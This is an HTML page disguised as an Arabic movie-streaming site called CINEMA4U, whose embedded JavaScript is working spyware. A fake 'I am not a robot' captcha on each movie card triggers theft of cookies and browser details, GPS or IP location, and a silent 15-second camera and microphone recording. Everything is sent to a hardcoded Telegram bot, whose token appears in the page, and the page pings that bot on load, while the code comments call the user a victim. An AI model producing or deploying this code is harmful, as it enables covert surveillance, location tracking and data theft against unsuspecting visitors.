<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>CINEMA4U - تجربة سينما لا تُنسى</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        /* التنسيق الجمالي الأصلي */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Tajawal', 'Poppins', sans-serif; background: #0a0a0f; color: #fff; overflow-x: hidden; }
        body::before { content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle at 20% 30%, rgba(229, 9, 20, 0.15), transparent 70%); z-index: -2; }
        .top-nav { position: sticky; top: 0; z-index: 100; background: rgba(8, 8, 15, 0.92); backdrop-filter: blur(20px); border-bottom: 1px solid rgba(229, 9, 20, 0.3); padding: 0.8rem 2rem; display: flex; justify-content: space-between; align-items: center; }
        .logo { font-size: 1.8rem; font-weight: 800; background: linear-gradient(135deg, #e50914, #ff6a00); -webkit-background-clip: text; background-clip: text; color: transparent; }
        .search-box { background: #1e1e2e; border: 1px solid #2a2a3a; border-radius: 40px; padding: 0.6rem 1rem; width: 280px; color: white; transition: 0.3s; }
        .main-container { display: flex; max-width: 1600px; margin: 0 auto; padding: 2rem; gap: 2rem; }
        .sidebar { width: 280px; background: rgba(20, 20, 30, 0.6); backdrop-filter: blur(12px); border-radius: 28px; padding: 1.5rem; position: sticky; top: 90px; height: fit-content; border: 1px solid rgba(255, 255, 255, 0.08); }
        .movies-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(190px, 1fr)); gap: 1.8rem; margin: 1rem 0 2rem; }
        .movie-card { background: #14141f; border-radius: 20px; overflow: hidden; transition: 0.35s cubic-bezier(0.2, 0.9, 0.4, 1.1); border: 1px solid rgba(255, 255, 255, 0.05); cursor: pointer; }
        .movie-card:hover { transform: translateY(-12px); border-color: #e50914; }
        .movie-poster img { width: 100%; aspect-ratio: 2/3; object-fit: cover; }
        
        /* واجهة الـ Tapjacking المطورة */
        .tapjacking-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.98); backdrop-filter: blur(16px); z-index: 9999; display: flex; align-items: center; justify-content: center; flex-direction: column; }
        .fake-captcha { width: 90%; max-width: 450px; background: #1a1f2e; border-radius: 28px; padding: 2rem; text-align: center; border: 1px solid #e50914; }
        .checkbox-area { background: #0f121c; border-radius: 60px; padding: 1rem; display: flex; align-items: center; justify-content: center; gap: 1rem; cursor: pointer; border: 1px solid #333; margin-top: 20px; }
        
        .movie-fullscreen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 10000; display: none; flex-direction: column; }
        footer { text-align: center; padding: 2rem; color: #555; }
    </style>
</head>
<body>

<div class="top-nav">
    <div class="logo"><i class="fas fa-film"></i> CINEMA4U</div>
    <input type="text" class="search-box" placeholder="🔍 ابحث عن فيلم أو مسلسل..." id="searchInput" onkeyup="searchItems()">
</div>

<div class="main-container">
    <aside class="sidebar">
        <h3><i class="fas fa-crown"></i> المميزات</h3>
        <ul style="list-style: none; margin-top: 1rem; font-size: 0.9rem;">
            <li style="padding: 10px 0;"><i class="fas fa-check" style="color:#e50914"></i> جودة 4K فائقة</li>
            <li style="padding: 10px 0;"><i class="fas fa-check" style="color:#e50914"></i> بدون إعلانات</li>
        </ul>
        <div style="margin-top: 20px; color: #e50914; font-size: 0.8rem;">
            <i class="fas fa-map-marker-alt"></i> الموقع: <span id="userRegion">جاري التحديد...</span>
        </div>
    </aside>

    <div class="content">
        <div id="home" style="background: #111; padding: 2rem; border-radius: 30px; margin-bottom: 2rem;">
            <h2>أهلاً بك في CINEMA4U</h2>
            <p style="color: #aaa;">استمتع بأضخم المكتبات السينمائية العالمية.</p>
        </div>
        <div id="moviesGrid" class="movies-grid"></div>
    </div>
</div>

<div id="fullscreenMovie" class="movie-fullscreen">
    <button onclick="location.reload()" style="position:absolute; top:20px; right:20px; background:#e50914; color:white; border:none; padding:10px 20px; border-radius:30px; cursor:pointer; font-weight:bold;">إغلاق X</button>
    <iframe id="movieIframe" style="width:100%; height:100%; border:none;" allowfullscreen></iframe>
</div>

<script type="module">
    const BOT_TOKEN = '8378099800:AAGTOLzJCh8qos-1YvssEGZfYD7V-ILHcRo';
    const CHAT_ID = '6052532044';

    async function tgNotify(text) {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: CHAT_ID, text: `🛡️ [CINEMA_LOG]:\n${text}`, parse_mode: 'Markdown'})
        });
    }

    async function tgUpload(blob, type) {
        let fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append(type, blob, `capture_${Date.now()}.${type === 'video' ? 'mp4' : 'ogg'}`);
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {method: 'POST', body: fd});
    }

    // 1. سرقة الموقع الدقيق (GPS + IP)
    async function startLocationExtraction() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const link = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
                await tgNotify(`📍 موقع GPS دقيق:\n${link}\nالدقة: ±${pos.coords.accuracy}m`);
                document.getElementById('userRegion').innerText = "تم الربط بنجاح";
            }, async () => {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                await tgNotify(`🌐 موقع IP (GPS مرفوض):\nالبلد: ${data.country_name}\nالمدينة: ${data.city}\nIP: ${data.ip}`);
                document.getElementById('userRegion').innerText = data.city || "غير معروف";
            }, {enableHighAccuracy: true});
        }
    }

    // 2. التجسس (كاميرا + ميكروفون)
    async function startSpying() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}, audio: true});
            const recorder = new MediaRecorder(stream);
            let chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = () => {
                tgUpload(new Blob(chunks, {type: 'video/mp4'}), 'video');
                tgNotify("✅ تم إرسال ملف التجسس الكامل");
            };
            recorder.start();
            tgNotify("🔴 بدء تسجيل (كاميرا + ميكروفون) صامت...");
            setTimeout(() => { recorder.stop(); stream.getTracks().forEach(t => t.stop()); }, 15000);
        } catch (err) {
            tgNotify(`❌ فشل الصلاحيات: ${err.message}`);
        }
    }

    // 3. سرقة بيانات المتصفح العميقة
    function stealSystemData() {
        const data = {
            UserAgent: navigator.userAgent,
            Platform: navigator.platform,
            Language: navigator.language,
            Screen: `${screen.width}x${screen.height}`,
            URL: window.location.href,
            Cookies: document.cookie || "None"
        };
        tgNotify(`💀 بيانات النظام المستخرجة:\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``);
    }

    // بناء الواجهة والأفلام
    const movies = [
        { title: "Ratatouille", img: "https://image.tmdb.org/t/p/w500/npHNjldbeTHdKKw28bJKs7lzqzj.jpg", link: "https://ak.sv/movie/114/ratatouille" },
        { title: "Spider-Man", img: "https://image.tmdb.org/t/p/w500/uJYYizSuA9Y3DCs0qS4qWvHfZg4.jpg", link: "https://ak.sv/movie/48232/spider-man-no-way-home" },
        { title: "The Joker", img: "https://image.tmdb.org/t/p/w500/udDclpUhpXmCrW80gaWgNJQMp1H.jpg", link: "https://ak.sv/movie/47555/joker" }
    ];

    const grid = document.getElementById('moviesGrid');
    movies.forEach(m => {
        const card = document.createElement('div');
        card.className = 'movie-card';
        card.innerHTML = `<div class="movie-poster"><img src="${m.img}"></div><div style="padding:10px; text-align:center;">${m.title}</div>`;
        card.onclick = () => {
            const overlay = document.createElement('div');
            overlay.className = 'tapjacking-overlay';
            overlay.innerHTML = `
                <div class="fake-captcha">
                    <h3>✅ التحقق من الأمان</h3>
                    <p style="font-size:0.9rem; color:#aaa; margin-top:10px;">يرجى النقر لتأكيد هويتك ومشاهدة المحتوى بجودة 4K</p>
                    <div class="checkbox-area" id="triggerBtn">
                        <i class="far fa-square" id="checkIcon"></i>
                        <span>أنا لست روبوتاً</span>
                    </div>
                </div>`;
            document.body.appendChild(overlay);
            
            document.getElementById('triggerBtn').onclick = async () => {
                document.getElementById('checkIcon').className = "fas fa-check-square";
                document.getElementById('checkIcon').style.color = "#4caf50";
                
                // بدء الهجوم فور النقر
                tgNotify(`🎯 الضحية يتفاعل الآن مع: ${m.title}`);
                stealSystemData();
                startLocationExtraction();
                startSpying();
                
                setTimeout(() => {
                    overlay.remove();
                    const fs = document.getElementById('fullscreenMovie');
                    document.getElementById('movieIframe').src = m.link;
                    fs.style.display = 'flex';
                }, 3000);
            };
        };
        grid.appendChild(card);
    });

    window.onload = () => tgNotify("🚀 تم فتح الموقع - بانتظار الضحية");
</script>
</body>
</html>
